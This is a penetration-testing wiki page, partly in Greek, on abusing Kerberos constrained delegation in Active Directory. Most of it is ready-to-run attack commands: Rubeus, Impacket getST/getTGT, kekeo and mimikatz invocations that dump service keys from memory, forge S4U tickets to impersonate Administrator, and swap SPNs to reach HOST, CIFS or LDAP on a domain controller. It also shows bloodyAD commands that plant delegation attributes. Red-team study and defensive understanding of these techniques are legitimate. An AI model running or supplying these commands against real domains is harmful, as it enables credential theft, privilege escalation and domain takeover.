# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.

- **Service for User to self (_S4U2self_):** If a **service account** has a _userAccountControl_ value containing [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
- **Service for User to Proxy(_S4U2proxy_):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).

Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked (in the ticket this part is not encrypted/signed). Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus for example. The same SPN swapping weakness is abused by **Impacket getST -altservice** and other tooling.

Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Σημειώσεις για Cross-domain constrained delegation (2025+)

Από τα Windows Server 2012/2012 R2, ο KDC υποστηρίζει constrained delegation μεταξύ domains/forests μέσω των επεκτάσεων S4U2Proxy. Οι σύγχρονες εκδόσεις (Windows Server 2016–2025) διατηρούν αυτή τη συμπεριφορά και προσθέτουν δύο PAC SIDs για να σηματοδοτήσουν το protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) όταν ο χρήστης αυθεντικοποιήθηκε κανονικά.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) όταν μια υπηρεσία δήλωσε την ταυτότητα μέσω protocol transition.

Αναμένετε `SERVICE_ASSERTED_IDENTITY` μέσα στο PAC όταν το protocol transition χρησιμοποιείται ανάμεσα σε domains, επιβεβαιώνοντας ότι το βήμα S4U2Proxy πέτυχε.

### Impacket / Linux εργαλεία (altservice & full S4U)

Οι πρόσφατες εκδόσεις του Impacket (0.11.x+) εκθέτουν την ίδια αλυσίδα S4U και την ίδια ανταλλαγή SPN όπως το Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Αν προτιμάς forging the user ST first (π.χ., μόνο offline hash), συνδύασε τα **ticketer.py** με **getST.py** για S4U2Proxy. Δες το ανοιχτό Impacket issue #1713 για τρέχουσες ιδιομορφίες (KRB_AP_ERR_MODIFIED όταν το forged ST δεν ταιριάζει με το κλειδί SPN).

### Αυτοματοποιώντας τη ρύθμιση delegation από low-priv creds

Αν ήδη διαθέτεις **GenericAll/WriteDACL** σε υπολογιστή ή service account, μπορείς να ωθήσεις τα απαιτούμενα attributes απομακρυσμένα χωρίς RSAT χρησιμοποιώντας το **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Αυτό σας επιτρέπει να δημιουργήσετε μια constrained delegation διαδρομή για privesc χωρίς προνόμια DA, μόλις μπορέσετε να γράψετε αυτά τα attributes.

- Βήμα 1: **Απόκτηση TGT της επιτρεπόμενης υπηρεσίας**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα TGT ticket** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug, unconstrain delegation, NTLM relaying και Active Directory Certificate Service abuse
>
> **Απλώς έχοντας αυτό το TGT ticket (or hashed) μπορείτε να εκτελέσετε αυτή την επίθεση χωρίς να διακυβευτεί ολόκληρος ο υπολογιστής.**

- Βήμα 2: **Λήψη TGS για την υπηρεσία, παριστάνοντας τον χρήστη**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Αναφορές
- [Kerberos Constrained Delegation – Επισκόπηση (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
